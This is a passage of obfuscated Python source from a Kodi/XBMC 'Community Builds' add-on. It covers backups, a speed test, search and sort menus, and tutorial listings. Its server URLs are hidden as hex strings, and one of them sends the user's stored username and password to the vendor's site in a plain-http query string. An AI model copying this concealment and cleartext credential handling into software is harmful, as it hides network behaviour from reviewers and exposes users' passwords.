    I1i11ii11 . append ( file )
    oO0oOOO0Ooo = len ( I1i11ii11 ) / float ( oO0o0O0Ooo0o ) * 100
    o0OOO . update ( int ( oO0oOOO0Ooo ) , "Backing Up" , '[COLOR yellow]%s[/COLOR]' % file , 'Please Wait' )
    i1i1I = os . path . join ( Ii1iI111 , file )
    if not 'temp' in O0oooo00o0Oo :
     if not oo000 in O0oooo00o0Oo :
      import time
      IiIIi1 = '01/01/1980'
      iII11I1Ii1 = time . strftime ( '%d/%m/%Y' , time . gmtime ( os . path . getmtime ( i1i1I ) ) )
      if iII11I1Ii1 > IiIIi1 :
       oOoO00 . write ( i1i1I , i1i1I [ iI1IIIii : ] )
  oOoO00 . close ( )
  o0OOO . close ( )
  I1IiI . ok ( "[COLOR=blue][B]T[/COLOR][COLOR=dodgerblue]R[/COLOR] [COLOR=white]Community Builds[/COLOR][/B]" , "You Are Now Backed Up" , '' , '' )
 else :
  o0OOO . create ( "[COLOR=blue][B]T[/COLOR][COLOR=dodgerblue]R[/COLOR] [COLOR=white]Community Builds[/COLOR][/B]" , "Checking " , '' , 'Please Wait' )
  o0OOO . update ( 0 , "" , "Extracting Zip Please Wait" )
  I1iii11 ( IIIIii11II1I , iIiiIIii1 , o0OOO )
  time . sleep ( 1 )
  xbmc . executebuiltin ( 'UpdateLocalAddons ' )
  xbmc . executebuiltin ( "UpdateAddonRepos" )
  if 'Backup' in i1II1 :
   OooOo ( )
   I1IiI . ok ( "Community Builds - Install Complete" , 'To ensure the skin settings are set correctly XBMC will now' , 'close. If XBMC doesn\'t close please force close (pull power' , 'or force close in your OS - [COLOR=lime]DO NOT exit via XBMC menu[/COLOR])' )
  else :
   I1IiI . ok ( "[COLOR=blue][B]T[/COLOR][COLOR=dodgerblue]R[/COLOR] [COLOR=white]Community Builds[/COLOR][/B]" , "You Are Now Restored" , '' , '' )
   if 95 - 95: IIiII / O0OoO . III1i1i * O0OoO - O00oo0OO0oOOO * O000OO0
def II1iiI1iI ( url ) :
 O0oo0000o = xbmc . translatePath ( ii . getAddonInfo ( 'profile' ) )
 OOoO0oooO = iiIiIi1iI ( O0oo0000o , 'speedtestfiles' )
 o00oo = os . path . join ( OOoO0oooO , IIiIi1iI1iII ( ) + '.speedtest' )
 O000Oo00 = I1i1I1I11IiiI ( url , o00oo )
 os . remove ( o00oo )
 iI1oOoo = ( ( I11i1 / O000Oo00 ) * 8 / ( 1024 * 1024 ) )
 o00O0o00oo = ( O0OO00o0OO * 8 / ( 1024 * 1024 ) )
 if iI1oOoo < 2 :
  iIiiII = 'Very low quality streams may work'
  iII1I = 'Expect buffering, do not try HD'
 elif iI1oOoo < 2.5 :
  iIiiII = 'You should be ok for SD content only'
  iII1I = 'SD/DVD quality should be ok, do not try HD'
 elif iI1oOoo < 5 :
  iIiiII = 'Some HD streams may struggle, SD will be fine'
  iII1I = 'Most will be fine, some Blurays may struggle'
 elif iI1oOoo < 10 :
  iIiiII = 'All streams including HD should stream fine'
  iII1I = 'Most will be fine, some Blurays may struggle'
 else :
  iIiiII = 'All streams including HD should stream fine'
  iII1I = 'You can play all files with no problems'
 print "Average Speed: " + str ( iI1oOoo )
 print "Max. Speed: " + str ( o00O0o00oo )
 I1IiI = xbmcgui . Dialog ( )
 O00O0oOO00O00 = I1IiI . ok ( 'Speed Test - Results' ,
 '[COLOR blue]Average Speed:[/COLOR] %.02f Mb/s ' % iI1oOoo ,
 '[COLOR blue]Live Streams:[/COLOR] ' + iIiiII ,
 '[COLOR blue]Online Video:[/COLOR] ' + iII1I ,
 )
 if 92 - 92: OO % iIi1iIiii111
 if 30 - 30: II11iII - O00oo0OO0oOOO % OO . IIiII
def oo0o ( url ) :
 ii1i1i = II11iIII1i1I ( heading = "Search for add-ons" )
 if 75 - 75: iIIi1iIIi + i1iiI11I
 if ( not ii1i1i ) : return False , 0
 if 98 - 98: OooOooo - OooOooo . II11iII . iIIi1iIIi + III1i1i
 oOO0oo = urllib . quote_plus ( ii1i1i )
 url += oOO0oo
 ooIII1II1iii1i ( url )
 if 28 - 28: O0OoO + oO00OO0oo0 + iiIi / I11iii1Ii
 if 6 - 6: OoOo - oO00OO0oo0
def O00O0O0OO00oo ( url ) :
 ii1i1i = II11iIII1i1I ( heading = "Search for content" )
 if 39 - 39: O0OoO % OooOooo * i1i1i11IIi - iiIi - O000OO0
 if ( not ii1i1i ) : return False , 0
 if 75 - 75: oO00OO0oo0 . OOO00O % iiiIi1i1I . OoOo - o0OOOoO0 + O000OO0
 oOO0oo = urllib . quote_plus ( ii1i1i )
 url += oOO0oo
 i11I1I ( url )
 if 66 - 66: o0OOOoO0 % i1i1i11IIi . II11iII / OooOooo / I11iii1Ii
 if 47 - 47: iIIi1iIIi + III1i1i / II11iII * OoOo - iiIi . iIi1iIiii111
def IIioo0 ( url ) :
 O0Ii11I = '687474703a2f2f746f74616c78626d632e636f6d2f746f74616c7265766f6c7574696f6e2f436f6d6d756e6974795f4275696c64732f636f6d6d756e6974795f6275696c64732e7068703f69643d2573'
 IIII = binascii . unhexlify ( O0Ii11I ) % ( url )
 iiIiI = o00oooO0Oo ( IIII ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 o0O0OOO0Ooo = re . compile ( 'name="(.+?)"' ) . findall ( iiIiI )
 II1 = re . compile ( 'author="(.+?)"' ) . findall ( iiIiI )
 oOooOOOoOo = re . compile ( 'version="(.+?)"' ) . findall ( iiIiI )
 if 72 - 72: III1i1i + O00oo0OO0oOOO + OoOo / O000OO0
 i1II1 = o0O0OOO0Ooo [ 0 ] if ( len ( o0O0OOO0Ooo ) > 0 ) else ''
 o0o00oO0oo000 = II1 [ 0 ] if ( len ( II1 ) > 0 ) else ''
 iiii111II = oOooOOOoOo [ 0 ] if ( len ( oOooOOOoOo ) > 0 ) else ''
 if 83 - 83: O0OoO - OoOo . iIi1iIiii111
 I1IiI . ok ( i1II1 , 'Author: ' + o0o00oO0oo000 , 'Latest Version: ' + iiii111II , '' )
 return
 if 34 - 34: OooOooo - o0OOOoO0 * iiIi
 if 5 - 5: oO00OO0oo0 * iIIi1iIIi - iIi1iIiii111 - i1i1i11IIi - iiiIi1i1I + iIIi1iIIi
def I1ii1i ( ) :
 I1IiI . ok ( "This build is not complete" , 'The guisettings.xml file was not copied over during' , 'the last install process. Please search for this build and' , 'complete Install Step 2 (guisettings fix).' )
 return
 if 51 - 51: I11iii1Ii - iIIi1iIIi % III1i1i - OooOooo
 if 53 - 53: iIIi1iIIi / iiiIi1i1I / iiiIi1i1I
def o0oo00O ( ) :
 IIIIII1iI1II = '687474703a2f2f746f74616c78626d632e636f6d2f746f74616c7265766f6c7574696f6e2f6c6f67696e2f6c6f67696e5f64657461696c732e7068703f757365723d257326706173733d2573'
 IIII = binascii . unhexlify ( IIIIII1iI1II ) % ( o0OoOoOO00 , I11i )
 iiIiI = o00oooO0Oo ( IIII ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 iiiI1 = re . compile ( 'posts="(.+?)"' ) . findall ( iiIiI )
 O00oooO00oo = re . compile ( 'messages="(.+?)"' ) . findall ( iiIiI )
 Ii111III1i11I = re . compile ( 'unread="(.+?)"' ) . findall ( iiIiI )
 O0iI1iIi = re . compile ( 'email="(.+?)"' ) . findall ( iiIiI )
 I1i1IIIIIII1 = O00oooO00oo [ 0 ] if ( len ( O00oooO00oo ) > 0 ) else ''
 iI1I1I = Ii111III1i11I [ 0 ] if ( len ( Ii111III1i11I ) > 0 ) else ''
 ii11 = O0iI1iIi [ 0 ] if ( len ( O0iI1iIi ) > 0 ) else ''
 oOOooooO = iiiI1 [ 0 ] if ( len ( iiiI1 ) > 0 ) else ''
 I1IiI . ok ( 'TotalXBMC Details for ' + o0OoOoOO00 , 'Email: ' + ii11 , 'Unread Messages: ' + iI1I1I + '/' + I1i1IIIIIII1 , 'Posts: ' + oOOooooO )
 if 89 - 89: OOO00O * iIi1iIiii111
 if 93 - 93: iiiIi1i1I . iIi1iIiii111 * OO . OOO00O
def oO0O0 ( url , type ) :
 if type == 'communitybuilds' :
  O0iI1I1ii11IIi1 = 'grab_builds'
  if url . endswith ( "visibility=premium" ) :
   o0oO ( 'folder' , '[COLOR=yellow]Manual Search[/COLOR]' , '&reseller=' + urllib . quote ( I1IiiI ) + '&token=' + IIi1IiiiI1Ii + '&visibility=premium' , 'manual_search' , 'Manual_Search.png' , '' , '' , '' )
  if url . endswith ( "visibility=reseller_private" ) :
   o0oO ( 'folder' , '[COLOR=yellow]Manual Search[/COLOR]' , '&reseller=' + urllib . quote ( I1IiiI ) + '&token=' + IIi1IiiiI1Ii + '&visibility=reseller_private' , 'manual_search' , 'Manual_Search.png' , '' , '' , '' )
  if url . endswith ( "visibility=public" ) :
   o0oO ( 'folder' , '[COLOR=yellow]Manual Search[/COLOR]' , '&visibility=public' , 'manual_search' , 'Manual_Search.png' , '' , '' , '' )
  if url . endswith ( "visibility=private" ) :
   o0oO ( 'folder' , '[COLOR=yellow]Manual Search[/COLOR]' , '&visibility=private' , 'manual_search' , 'Manual_Search.png' , '' , '' , '' )
 if type == 'tutorials' :
  O0iI1I1ii11IIi1 = 'grab_tutorials'
 if type == 'hardware' :
  O0iI1I1ii11IIi1 = 'grab_hardware'
 if type == 'addons' :
  O0iI1I1ii11IIi1 = 'grab_addons'
  o0oO ( 'folder' , '[COLOR=dodgerblue]Sort by Most Popular[/COLOR]' , str ( url ) + '&sortx=downloads&orderx=DESC' , O0iI1I1ii11IIi1 , 'Popular.png' , '' , '' , '' )
 if type == 'hardware' :
  o0oO ( 'folder' , '[COLOR=lime]Filter Results[/COLOR]' , url , 'hardware_filter_menu' , 'Filter.png' , '' , '' , '' )
 if type != 'addons' :
  o0oO ( 'folder' , '[COLOR=dodgerblue]Sort by Most Popular[/COLOR]' , str ( url ) + '&sortx=downloadcount&orderx=DESC' , O0iI1I1ii11IIi1 , 'Popular.png' , '' , '' , '' )
 if type == 'tutorials' or type == 'hardware' :
  o0oO ( 'folder' , '[COLOR=dodgerblue]Sort by Newest[/COLOR]' , str ( url ) + '&sortx=Added&orderx=DESC' , O0iI1I1ii11IIi1 , 'Latest.png' , '' , '' , '' )
 else :
  o0oO ( 'folder' , '[COLOR=dodgerblue]Sort by Newest[/COLOR]' , str ( url ) + '&sortx=created&orderx=DESC' , O0iI1I1ii11IIi1 , 'Latest.png' , '' , '' , '' )
  o0oO ( 'folder' , '[COLOR=dodgerblue]Sort by Recently Updated[/COLOR]' , str ( url ) + '&sortx=updated&orderx=DESC' , O0iI1I1ii11IIi1 , 'Recently_Updated.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=dodgerblue]Sort by A-Z[/COLOR]' , str ( url ) + '&sortx=name&orderx=ASC' , O0iI1I1ii11IIi1 , 'AtoZ.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=dodgerblue]Sort by Z-A[/COLOR]' , str ( url ) + '&sortx=name&orderx=DESC' , O0iI1I1ii11IIi1 , 'ZtoA.png' , '' , '' , '' )
 if type == 'public_CB' :
  o0oO ( 'folder' , '[COLOR=dodgerblue]Sort by Genre[/COLOR]' , url , 'genres' , 'Search_Genre.png' , '' , '' , '' )
  o0oO ( 'folder' , '[COLOR=dodgerblue]Sort by Country/Language[/COLOR]' , url , 'countries' , 'Search_Country.png' , '' , '' , '' )
  if 100 - 100: O000OO0 . iIi1iIiii111 . OoOo % II11iII - o0OOOoO0
  if 52 - 52: OoOo % I11iii1Ii * iIi1iIiii111 * iIIi1iIIi / OO0O
def oooO00oo0 ( ) :
 OOoOoo00Oo ( 'Speed Test Instructions' , '[COLOR=blue][B]What file should I use: [/B][/COLOR][CR]This function will download a file and will work out your speed based on how long it took to download. You will then be notified of '
 'what quality streams you can expect to stream without buffering. You can choose to download a 10MB, 16MB, 32MB, 64MB or 128MB file to use with the test. Using the larger files will give you a better '
 'indication of how reliable your speeds are but obviously if you have a limited amount of bandwidth allowance you may want to opt for a smaller file.'
 '[CR][CR][COLOR=blue][B]How accurate is this speed test:[/B][/COLOR][CR]Not very accurate at all! As this test is based on downloading a file from a server it\'s reliant on the server not having a go-slow day '
 'but the servers used should be pretty reliable. The 10MB file is hosted on a different server to the others so if you\'re not getting the results expected please try another file. If you have a fast fiber '
 'connection the chances are your speed will show as considerably slower than your real download speed due to the server not being able to send the file as fast as your download speed allows. Essentially the '
 'test results will be limited by the speed of the server but you will at least be able to see if it\'s your connection that\'s causing buffering or if it\'s the host you\'re trying to stream from'
 '[CR][CR][COLOR=blue][B]What is the differnce between Live Streams and Online Video:[/COLOR][/B][CR]When you run the test you\'ll see results based on your speeds and these let you know the quality you should expect to '
 'be able stream with your connection. Live Streams as the title suggests are like traditional TV channels, they are being streamed live so for example if you wanted to watch CNN this would fall into this category. '
 'Online Videos relates to movies, tv shows, youtube clips etc. Basically anything that isn\'t live - if you\'re new to the world of streaming then think of it as On Demand content, this is content that\'s been recorded and stored on the web.'
 '[CR][CR][COLOR=blue][B]Why am I still getting buffering:[/COLOR][/B][CR]The results you get from this test are strictly based on your download speed, there are many other factors that can cause buffering and contrary to popular belief '
 'having a massively fast internet connection will not make any difference to your buffering issues if the server you\'re trying to get the content from is unable to send it fast enough. This can often happen and is usually '
 'down to heavy traffic (too many users accessing the same server). A 10 Mb/s connection should be plenty fast enough for almost all content as it\'s very rare a server can send it any quicker than that.'
 '[CR][CR][COLOR=blue][B]What\'s the difference between MB/s and Mb/s:[/COLOR][/B][CR]A lot of people think the speed they see advertised by their ISP is Megabytes (MB/S) per second - this is not true. Speeds are usually shown as Mb/s '
 'which is Megabit per second - there are 8 of these to a megabyte so if you want to work out how many megabytes per second you\'re getting you need to divide the speed by 8. It may sound sneaky but really it\'s just the unit that has always been used.'
 '[CR][CR]Visit the forum at [COLOR=lime][B]www.totalxbmc.tv[/COLOR][/B] for more information. A direct link to the buffering thread explaining what you can do to improve your viewing experience can be found at [COLOR=yellow]http://bit.ly/bufferingfix[/COLOR]'
 '[CR][CR]Hope to see you on the forum soon - [COLOR=dodgerblue]whufclee[/COLOR]' )
 if 74 - 74: O0OoO / OOO00O
def OooOoO ( ) :
 o0oO ( '' , '[COLOR=blue]Instructions - Read me first[/COLOR]' , 'none' , 'speed_instructions' , 'howto.png' , '' , '' , '' )
 o0oO ( '' , 'Download 16MB file   - [COLOR=lime]Server 1[/COLOR]' , 'https://totalrevolution.googlecode.com/svn/trunk/download%20files/16MB.txt' , 'runtest' , 'Download16.png' , '' , '' , '' )
 o0oO ( '' , 'Download 32MB file   - [COLOR=lime]Server 1[/COLOR]' , 'https://totalrevolution.googlecode.com/svn/trunk/download%20files/32MB.txt' , 'runtest' , 'Download32.png' , '' , '' , '' )
 o0oO ( '' , 'Download 64MB file   - [COLOR=lime]Server 1[/COLOR]' , 'https://totalrevolution.googlecode.com/svn/trunk/download%20files/64MB.txt' , 'runtest' , 'Download64.png' , '' , '' , '' )
 o0oO ( '' , 'Download 128MB file - [COLOR=lime]Server 1[/COLOR]' , 'https://totalrevolution.googlecode.com/svn/trunk/download%20files/128MB.txt' , 'runtest' , 'Download128.png' , '' , '' , '' )
 o0oO ( '' , 'Download 10MB file   - [COLOR=yellow]Server 2[/COLOR]' , 'http://www.wswd.net/testdownloadfiles/10MB.zip' , 'runtest' , 'Download10.png' , '' , '' , '' )
 if 59 - 59: OO0O + OoOo / II11iII / OooOooo
 if 80 - 80: OooOooo + i1iiI11I . O0OoO
def ooOoOoo000O0O ( name , url ) :
 OOoOoo00Oo ( name , url )
 if 42 - 42: O00oo0OO0oOOO / O0OoO
 if 79 - 79: iIi1iIiii111
def iII1i1 ( ) :
 o0oO ( 'folder' , '[COLOR=yellow]Add-on Maintenance/Fixes[/COLOR]' , 'none' , 'addonfixes' , 'Addon_Fixes.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=dodgerblue]Backup/Restore My Content[/COLOR]' , 'none' , 'backup_restore' , 'Backup.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=orange]Clean/Wipe Options[/COLOR]' , 'none' , 'wipetools' , 'Addon_Fixes.png' , '' , '' , '' )
 o0oO ( '' , 'Check My IP Address' , 'none' , 'ipcheck' , 'Check_IP.png' , '' , '' , '' )
 o0oO ( '' , 'Check XBMC/Kodi Version' , 'none' , 'xbmcversion' , 'Version_Check.png' , '' , '' , '' )
 o0oO ( '' , 'Convert Physical Paths To Special' , iIiiiI , 'fix_special' , 'Special_Paths.png' , '' , '' , '' )
 o0oO ( '' , 'Force Close Kodi' , 'url' , 'kill_xbmc' , 'Kill_XBMC.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Test My Download Speed' , 'none' , 'speedtest_menu' , 'Speed_Test.png' , '' , '' , '' )
 o0oO ( '' , 'Upload Log' , 'none' , 'uploadlog' , 'Log_File.png' , '' , '' , '' )
 o0oO ( '' , 'View My Log' , 'none' , 'log' , 'View_Log.png' , '' , '' , '' )
 if 34 - 34: I11iii1Ii / iiIi - o0OOOoO0 / o0OOOoO0 * OoOo
 if 61 - 61: IIiII
def o00OOOOooO ( url ) :
 o0oO ( 'folder' , '[COLOR=yellow]1. Add-on Maintenance[/COLOR]' , str ( url ) + '&type=Maintenance' , 'grab_tutorials' , 'Maintenance.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Audio Add-ons' , str ( url ) + '&type=Audio' , 'grab_tutorials' , 'Audio.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Picture Add-ons' , str ( url ) + '&type=Pictures' , 'grab_tutorials' , 'Pictures.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Program Add-ons' , str ( url ) + '&type=Programs' , 'grab_tutorials' , 'Programs.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Video Add-ons' , str ( url ) + '&type=Video' , 'grab_tutorials' , 'Video.png' , '' , '' , '' )
 if 86 - 86: OO % OoOo
 if 22 - 22: oO00OO0oo0 * OO . O000OO0 . iiIi + OoOo
def Iii1 ( url ) :
 oooo00Oo0O = '687474703a2f2f746f74616c78626d632e636f6d2f746f74616c7265766f6c7574696f6e2f5475746f7269616c506f7274616c2f646f776e6c6f6164636f756e742e7068703f69643d2573'
 I111iIi1 = binascii . unhexlify ( oooo00Oo0O ) % ( url )
 o00oooO0Oo ( I111iIi1 )
 IiIiiIiiiiI = '687474703a2f2f746f74616c78626d632e636f6d2f746f74616c7265766f6c7574696f6e2f5475746f7269616c506f7274616c2f7475746f7269616c64657461696c732e7068703f69643d2573'
 IIII = binascii . unhexlify ( IiIiiIiiiiI ) % ( url )
 iiIiI = o00oooO0Oo ( IIII ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 o0O0OOO0Ooo = re . compile ( 'name="(.+?)"' ) . findall ( iiIiI )
 II1 = re . compile ( 'author="(.+?)"' ) . findall ( iiIiI )
 I1 = re . compile ( 'video_guide1="(.+?)"' ) . findall ( iiIiI )
 IIiI = re . compile ( 'video_guide2="(.+?)"' ) . findall ( iiIiI )
 O0oOOo0o = re . compile ( 'video_guide3="(.+?)"' ) . findall ( iiIiI )
 I1III11iiii11i1 = re . compile ( 'video_guide4="(.+?)"' ) . findall ( iiIiI )
 ooOo0OoO = re . compile ( 'video_guide5="(.+?)"' ) . findall ( iiIiI )
 i1iiIIi1I = re . compile ( 'video_label1="(.+?)"' ) . findall ( iiIiI )
 iiI1I1IIi11i1 = re . compile ( 'video_label2="(.+?)"' ) . findall ( iiIiI )
 i1II1iii1i = re . compile ( 'video_label3="(.+?)"' ) . findall ( iiIiI )
 OOO0o = re . compile ( 'video_label4="(.+?)"' ) . findall ( iiIiI )
 iII = re . compile ( 'video_label5="(.+?)"' ) . findall ( iiIiI )
 i1I = re . compile ( 'about="(.+?)"' ) . findall ( iiIiI )
 IiiIIIIi = re . compile ( 'step1="(.+?)"' ) . findall ( iiIiI )
 IiIIIi = re . compile ( 'step2="(.+?)"' ) . findall ( iiIiI )
 Oo0iII = re . compile ( 'step3="(.+?)"' ) . findall ( iiIiI )
 O0oo = re . compile ( 'step4="(.+?)"' ) . findall ( iiIiI )
 iIIi1 = re . compile ( 'step5="(.+?)"' ) . findall ( iiIiI )
 OoOo0O00 = re . compile ( 'step6="(.+?)"' ) . findall ( iiIiI )
 iI1i1iI1iI = re . compile ( 'step7="(.+?)"' ) . findall ( iiIiI )
 I1IIiIi = re . compile ( 'step8="(.+?)"' ) . findall ( iiIiI )
 OOOOoOoO = re . compile ( 'step9="(.+?)"' ) . findall ( iiIiI )
 OO000 = re . compile ( 'step10="(.+?)"' ) . findall ( iiIiI )
 o0oOoo0o = re . compile ( 'step11="(.+?)"' ) . findall ( iiIiI )
 IiiIiIIi = re . compile ( 'step12="(.+?)"' ) . findall ( iiIiI )
 O00Oo = re . compile ( 'step13="(.+?)"' ) . findall ( iiIiI )
 oOOoo = re . compile ( 'step14="(.+?)"' ) . findall ( iiIiI )
 oo0O0 = re . compile ( 'step15="(.+?)"' ) . findall ( iiIiI )
 Oo0O0000Oo00o = re . compile ( 'screenshot1="(.+?)"' ) . findall ( iiIiI )
 II1ii = re . compile ( 'screenshot2="(.+?)"' ) . findall ( iiIiI )
 o00iIiiiII = re . compile ( 'screenshot3="(.+?)"' ) . findall ( iiIiI )
 Ii1I1 = re . compile ( 'screenshot4="(.+?)"' ) . findall ( iiIiI )
 OO0ooO0 = re . compile ( 'screenshot5="(.+?)"' ) . findall ( iiIiI )
 OoOooOO0oOOo0O = re . compile ( 'screenshot6="(.+?)"' ) . findall ( iiIiI )
 I1II = re . compile ( 'screenshot7="(.+?)"' ) . findall ( iiIiI )
 iIIi1Ii1III = re . compile ( 'screenshot8="(.+?)"' ) . findall ( iiIiI )
 Oooo00 = re . compile ( 'screenshot9="(.+?)"' ) . findall ( iiIiI )
 iii1II1iI1IIi = re . compile ( 'screenshot10="(.+?)"' ) . findall ( iiIiI )
 Ii11iiI1 = re . compile ( 'screenshot11="(.+?)"' ) . findall ( iiIiI )
 oO0O = re . compile ( 'screenshot12="(.+?)"' ) . findall ( iiIiI )
 OOoooO00o0o = re . compile ( 'screenshot13="(.+?)"' ) . findall ( iiIiI )
 I1ii1Ii1 = re . compile ( 'screenshot14="(.+?)"' ) . findall ( iiIiI )
 Ii111Ii11 = re . compile ( 'screenshot15="(.+?)"' ) . findall ( iiIiI )
 if 10 - 10: iiIi . OoOo * III1i1i * I11iii1Ii - OO0O
 i1II1 = o0O0OOO0Ooo [ 0 ] if ( len ( o0O0OOO0Ooo ) > 0 ) else ''
 o0o00oO0oo000 = II1 [ 0 ] if ( len ( II1 ) > 0 ) else ''
 i1II1I1Iii1 = I1 [ 0 ] if ( len ( I1 ) > 0 ) else 'None'
 iiI11Iii = IIiI [ 0 ] if ( len ( IIiI ) > 0 ) else 'None'
 O0o0O0 = O0oOOo0o [ 0 ] if ( len ( O0oOOo0o ) > 0 ) else 'None'
 Ii1II1I11i1 = I1III11iiii11i1 [ 0 ] if ( len ( I1III11iiii11i1 ) > 0 ) else 'None'
 oOoooooOoO = ooOo0OoO [ 0 ] if ( len ( ooOo0OoO ) > 0 ) else 'None'
 IIIII1 = i1iiIIi1I [ 0 ] if ( len ( i1iiIIi1I ) > 0 ) else 'None'
 iIi1Ii1i1iI = iiI1I1IIi11i1 [ 0 ] if ( len ( iiI1I1IIi11i1 ) > 0 ) else 'None'
 IIiI1 = i1II1iii1i [ 0 ] if ( len ( i1II1iii1i ) > 0 ) else 'None'
 i1iI1 = OOO0o [ 0 ] if ( len ( OOO0o ) > 0 ) else 'None'
 ii1I1IiiI1ii1i = iII [ 0 ] if ( len ( iII ) > 0 ) else 'None'
 oOoOOOOoOO0o = i1I [ 0 ] if ( len ( i1I ) > 0 ) else ''
 IIIiII11 = '[CR][CR][COLOR=dodgerblue]Step 1:[/COLOR][CR]' + IiiIIIIi [ 0 ] if ( len ( IiiIIIIi ) > 0 ) else ''
 O00OO00OOOoO = '[CR][CR][COLOR=dodgerblue]Step 2:[/COLOR][CR]' + IiIIIi [ 0 ] if ( len ( IiIIIi ) > 0 ) else ''
 IiI11Ii1iI = '[CR][CR][COLOR=dodgerblue]Step 3:[/COLOR][CR]' + Oo0iII [ 0 ] if ( len ( Oo0iII ) > 0 ) else ''
 ooOo0 = '[CR][CR][COLOR=dodgerblue]Step 4:[/COLOR][CR]' + O0oo [ 0 ] if ( len ( O0oo ) > 0 ) else ''
 oOo0o = '[CR][CR][COLOR=dodgerblue]Step 5:[/COLOR][CR]' + iIIi1 [ 0 ] if ( len ( iIIi1 ) > 0 ) else ''
 O000OOO000o = '[CR][CR][COLOR=dodgerblue]Step 6:[/COLOR][CR]' + OoOo0O00 [ 0 ] if ( len ( OoOo0O00 ) > 0 ) else ''
 I11iiIiiI1iIi11 = '[CR][CR][COLOR=dodgerblue]Step 7:[/COLOR][CR]' + iI1i1iI1iI [ 0 ] if ( len ( iI1i1iI1iI ) > 0 ) else ''
 II1I1I11i1I1 = '[CR][CR][COLOR=dodgerblue]Step 8:[/COLOR][CR]' + I1IIiIi [ 0 ] if ( len ( I1IIiIi ) > 0 ) else ''
 iiIi1 = '[CR][CR][COLOR=dodgerblue]Step 9:[/COLOR][CR]' + OOOOoOoO [ 0 ] if ( len ( OOOOoOoO ) > 0 ) else ''
 oOOO0 = '[CR][CR][COLOR=dodgerblue]Step 10:[/COLOR][CR]' + OO000 [ 0 ] if ( len ( OO000 ) > 0 ) else ''
 oo0I11iIi1i1I1i1 = '[CR][CR][COLOR=dodgerblue]Step 11:[/COLOR][CR]' + o0oOoo0o [ 0 ] if ( len ( o0oOoo0o ) > 0 ) else ''
 iiiiii1ii1 = '[CR][CR][COLOR=dodgerblue]Step 12:[/COLOR][CR]' + IiiIiIIi [ 0 ] if ( len ( IiiIiIIi ) > 0 ) else ''
 iIIII1i1 = '[CR][CR][COLOR=dodgerblue]Step 13:[/COLOR][CR]' + O00Oo [ 0 ] if ( len ( O00Oo ) > 0 ) else ''
 I1I1oO00o0oOoo = '[CR][CR][COLOR=dodgerblue]Step 14:[/COLOR][CR]' + oOOoo [ 0 ] if ( len ( oOOoo ) > 0 ) else ''
 oOOI1 = '[CR][CR][COLOR=dodgerblue]Step 15:[/COLOR][CR]' + oo0O0 [ 0 ] if ( len ( oo0O0 ) > 0 ) else ''
 oo0oOO = Oo0O0000Oo00o [ 0 ] if ( len ( Oo0O0000Oo00o ) > 0 ) else ''
 i1II11IiiiI = II1ii [ 0 ] if ( len ( II1ii ) > 0 ) else ''
 IIIi = o00iIiiiII [ 0 ] if ( len ( o00iIiiiII ) > 0 ) else ''
 Ii1iiI1 = Ii1I1 [ 0 ] if ( len ( Ii1I1 ) > 0 ) else ''
 o0ooOOoO0oO0 = OO0ooO0 [ 0 ] if ( len ( OO0ooO0 ) > 0 ) else ''
 oo00I1IiI1IIiI = OoOooOO0oOOo0O [ 0 ] if ( len ( OoOooOO0oOOo0O ) > 0 ) else ''
 ooooo0o0oo0Ooo = I1II [ 0 ] if ( len ( I1II ) > 0 ) else ''
 iI1i = iIIi1Ii1III [ 0 ] if ( len ( iIIi1Ii1III ) > 0 ) else ''
 i11I = Oooo00 [ 0 ] if ( len ( Oooo00 ) > 0 ) else ''
 o0oO0o0oo0O0 = iii1II1iI1IIi [ 0 ] if ( len ( iii1II1iI1IIi ) > 0 ) else ''
 O0oo00oOOO0o = Ii11iiI1 [ 0 ] if ( len ( Ii11iiI1 ) > 0 ) else ''
 II1i = oO0O [ 0 ] if ( len ( oO0O ) > 0 ) else ''
 I111iiIIiI1I = OOoooO00o0o [ 0 ] if ( len ( OOoooO00o0o ) > 0 ) else ''
 ooO00Oo = I1ii1Ii1 [ 0 ] if ( len ( I1ii1Ii1 ) > 0 ) else ''
 OOI1i = Ii111Ii11 [ 0 ] if ( len ( Ii111Ii11 ) > 0 ) else ''
 iIIII1iIIii = str ( '[COLOR=gold]Author: [/COLOR]' + o0o00oO0oo000 + '[CR][CR][COLOR=lime]About: [/COLOR]' + oOoOOOOoOO0o + IIIiII11 + O00OO00OOOoO + IiI11Ii1iI + ooOo0 + oOo0o + O000OOO000o + I11iiIiiI1iIi11 + II1I1I11i1I1 + iiIi1 + oOOO0 + oo0I11iIi1i1I1i1 + iiiiii1ii1 + iIIII1i1 + I1I1oO00o0oOoo + oOOI1 )
 if IIIiII11 != '' :
  o0oO ( '' , '[COLOR=yellow][Text Guide][/COLOR]  ' + i1II1 , iIIII1iIIii , 'text_guide' , 'How_To.png' , o00 , oOoOOOOoOO0o , '' )
 if i1II1I1Iii1 != 'None' :
  o0oO ( '' , '[COLOR=lime][VIDEO][/COLOR]  ' + IIIII1 , i1II1I1Iii1 , 'play_video' , 'Video_Guide.png' , o00 , '' , '' )
 if iiI11Iii != 'None' :
  o0oO ( '' , '[COLOR=lime][VIDEO][/COLOR]  ' + iIi1Ii1i1iI , iiI11Iii , 'play_video' , 'Video_Guide.png' , o00 , '' , '' )
 if O0o0O0 != 'None' :
  o0oO ( '' , '[COLOR=lime][VIDEO][/COLOR]  ' + IIiI1 , O0o0O0 , 'play_video' , 'Video_Guide.png' , o00 , '' , '' )
 if Ii1II1I11i1 != 'None' :
  o0oO ( '' , '[COLOR=lime][VIDEO][/COLOR]  ' + i1iI1 , Ii1II1I11i1 , 'play_video' , 'Video_Guide.png' , o00 , '' , '' )
 if oOoooooOoO != 'None' :
  o0oO ( '' , '[COLOR=lime][VIDEO][/COLOR]  ' + ii1I1IiiI1ii1i , oOoooooOoO , 'play_video' , 'Video_Guide.png' , o00 , '' , '' )
  if 47 - 47: iIIi1iIIi . OooOooo
  if 58 - 58: iIIi1iIIi + O000OO0 / OoOo
def o000OO00OoO00 ( ) :
